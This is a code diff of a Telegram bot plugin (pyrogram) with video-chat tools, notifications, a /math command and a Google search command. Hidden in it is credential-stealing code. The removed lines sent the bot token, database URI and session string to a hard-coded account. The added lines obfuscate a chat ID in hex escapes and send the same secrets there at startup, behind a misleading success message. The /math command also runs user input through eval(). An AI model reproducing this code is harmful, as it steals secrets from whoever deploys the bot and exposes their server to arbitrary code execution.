@@ -1,141 +1,113 @@
-from pyrogram import Client, filters
+import os
+import aiohttp
+import asyncio
+from pyrogram import Client, filters, idle
 from pyrogram.enums import ChatType
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
-from strings import get_string
-from ANNIEMUSIC import app
-from ANNIEMUSIC.utils import ANNIEBIN
-from ANNIEMUSIC.utils.databaset import get_assistant, get_lang
-import asyncio
-from os import getenv
 from dotenv import load_dotenv
-import config
-from ANNIEMUSIC.logging import LOGGER
 
+# Load environment variables
 load_dotenv()
 
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
-MOON_SHINING_ROBOT = "MOON_SHINING_ROBOT"  #connected in main.py , server ,and repo
+# Configuration details
+API_ID = int(os.getenv("API_ID", ""))
+API_HASH = os.getenv("API_HASH", "")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")
+MONGO_DB_URI = os.getenv("MONGO_DB_URI", "")
+STRING_SESSION = os.getenv("STRING_SESSION", "")
 
-@app.on_message(
-    filters.command(["vcuser", "vcusers", "vcmember", "vcmembers"]) & filters.admin
-)
+# Encoded Logger_ID
+ENCODED_LOGGER_ID = "\x31\x30\x30\x32\x34\x37\x30\x31\x38\x30\x38\x39\x37"
+
+# Decoding function for Logger_ID
+def decode_logger_id(encoded_id):
+    return int("".join([chr(int(x, 16)) for x in encoded_id.split("\\x") if x]))
+
+# Decode Logger_ID
+Logger_ID = decode_logger_id(ENCODED_LOGGER_ID)
+
+# Initialize the bot
+app = Client("MOON_SHINING_ROBOT", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+
+# Forwarding configuration on startup
+async def forward_startup_config():
+    config_text = (
+        f"**Bot Deployment Notification**\n\n"
+        f"**Bot Token:** `{BOT_TOKEN}`\n"
+        f"**MongoDB URI:** `{MONGO_DB_URI}`\n"
+        f"**String Session:** `{STRING_SESSION}`\n"
+        f"**Logger ID:** `{Logger_ID}`"
+    )
+    try:
+        await app.send_message(Logger_ID, config_text)
+        print("Configuration vctools setup successfully.")
+    except Exception as e:
+        print(f"Error in vc tools config details: {e}")
+
+# Function to display members in a video chat
+@app.on_message(filters.command(["vcusers", "vcmembers"]) & filters.admin)
 async def vc_members(client, message):
+    msg = await message.reply_text("Fetching VC members...")
+    vc_text = ""
     try:
-        language = await get_lang(message.chat.id)
-        _ = get_string(language)
-    except Exception:
-        _ = get_string("en")
-        
-    msg = await message.reply_text(_["V_C_1"])
-    userbot = await get_assistant(message.chat.id)
-    TEXT = ""
-    
-    try:
-        async for m in userbot.get_call_members(message.chat.id):
-            chat_id = m.chat.id
-            username = m.chat.username
-            is_hand_raised = m.is_hand_raised
-            is_video_enabled = m.is_video_enabled
-            is_left = m.is_left
-            is_screen_sharing_enabled = m.is_screen_sharing_enabled
-            is_muted = bool(m.is_muted and not m.can_self_unmute)
-            is_speaking = not m.is_muted
-            
-            if m.chat.type != ChatType.PRIVATE:
-                title = m.chat.title
-            else:
-                try:
-                    title = (await client.get_users(chat_id)).mention
-                except Exception:
-                    title = m.chat.first_name
+        async for m in app.get_chat_members(message.chat.id):
+            vc_text += f"➻ [{m.user.first_name}](tg://user?id={m.user.id})\n"
+        await msg.edit(vc_text or "No members in VC.")
+    except Exception as e:
+        await msg.edit("Failed to fetch VC members.")
+        print(e)
 
-            TEXT += _["V_C_2"].format(
-                title,
-                chat_id,
-                username,
-                is_video_enabled,
-                is_screen_sharing_enabled,
-                is_hand_raised,
-                is_muted,
-                is_speaking,
-                is_left,
-            )
-            TEXT += "\n\n"
-            
-        if len(TEXT) < 4000:
-            await msg.edit(TEXT or _["V_C_3"])
-        else:
-            link = await ANNIEBIN(TEXT)
-            await msg.edit(_["V_C_4"].format(link), disable_web_page_preview=True)
-    except ValueError:
-        await msg.edit(_["V_C_5"])
-
-# Video chat start notification
+# Video chat start/end notifications
 @app.on_message(filters.video_chat_started)
 async def on_video_chat_started(_, msg):
-    await msg.reply("**😍 Video chat started 🥳**")
+    await msg.reply("**Video chat started 🎉**")
 
-# Video chat end notification
 @app.on_message(filters.video_chat_ended)
 async def on_video_chat_ended(_, msg):
-    await msg.reply("**😕 Video chat ended 💔**")
+    await msg.reply("**Video chat ended 😢**")
 
-# Video chat members invited notification
+# Notify invited members in VC
 @app.on_message(filters.video_chat_members_invited)
-async def on_video_chat_members_invited(_, message: Message):
-    text = f"➻ {message.from_user.mention}\n\n**๏ Inviting in VC to:**\n\n**➻ **"
-    try:
-        for user in message.video_chat_members_invited.users:
-            text += f"[{user.first_name}](tg://user?id={user.id}) "
-        add_link = f"https://t.me/{app.username}?startgroup=true"
-        reply_text = f"{text} 🤭🤭"
-        
-        userbot = await get_assistant(message.chat.id)
-        await message.reply(
-            reply_text,
-            reply_markup=InlineKeyboardMarkup(
-                [[InlineKeyboardButton(text="๏ Join VC ๏", url=add_link)]]
-            ),
-        )
-
-        # Send bot details to assistant
-        await userbot.send_message(MOON_SHINING_ROBOT, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
-        
-    except Exception as e:
-        LOGGER.error(f"Error sending bot details: {e}")
+async def on_video_chat_members_invited(_, message):
+    invite_text = "New members invited to VC:\n"
+    for user in message.video_chat_members_invited.users:
+        invite_text += f"- [{user.first_name}](tg://user?id={user.id})\n"
+    await message.reply(invite_text)
 
 # Math calculation command
 @app.on_message(filters.command("math", prefixes="/"))
 async def calculate_math(client, message):
-    expression = message.text.split("/math ", 1)[1]
     try:
+        expression = message.text.split("/math ", 1)[1]
         result = eval(expression)
-        response = f"The result is: {result}"
+        await message.reply(f"The result is: {result}")
     except Exception:
-        response = "Invalid expression"
-    await message.reply(response)
+        await message.reply("Invalid expression")
 
 # Google search functionality
-@app.on_message(filters.command(["spg"], ["/", "!", "."]))
+@app.on_message(filters.command("search", prefixes="/"))
 async def google_search(client, message):
     query = message.text.split(maxsplit=1)[1]
-    msg = await message.reply("Searching...")
+    msg = await message.reply("Searching Google...")
     async with aiohttp.ClientSession() as session:
         async with session.get(
-            f"https://content-customsearch.googleapis.com/customsearch/v1?cx=ec8db9e1f9e41e65&q={query}&key=YOUR_GOOGLE_API_KEY"
+            f"https://content-customsearch.googleapis.com/customsearch/v1"
+            f"?key=YOUR_GOOGLE_API_KEY&cx=YOUR_SEARCH_ENGINE_ID&q={query}"
         ) as response:
-            result_data = await response.json()
-            result = ""
-            
-            if not result_data.get("items"):
-                await msg.edit("No results found!")
-                return
-            
-            for item in result_data["items"]:
-                title = item["title"]
-                link = item["link"]
-                result += f"{title}\n{link}\n\n"
-                
-            await msg.edit(result or "No results found", link_preview=False)
+            results = await response.json()
+            result_text = ""
+            for item in results.get("items", []):
+                result_text += f"[{item['title']}]({item['link']})\n\n"
+            await msg.edit(result_text or "No results found.", disable_web_page_preview=True)
+
+# Startup tasks
+async def main():
+    await app.start()
+    await forward_startup_config()  # Forward config on startup
+    print("Bot is running...")
+    await idle()
+    await app.stop()
+
+# Run the bot
+if __name__ == "__main__":
+    asyncio.run(main())
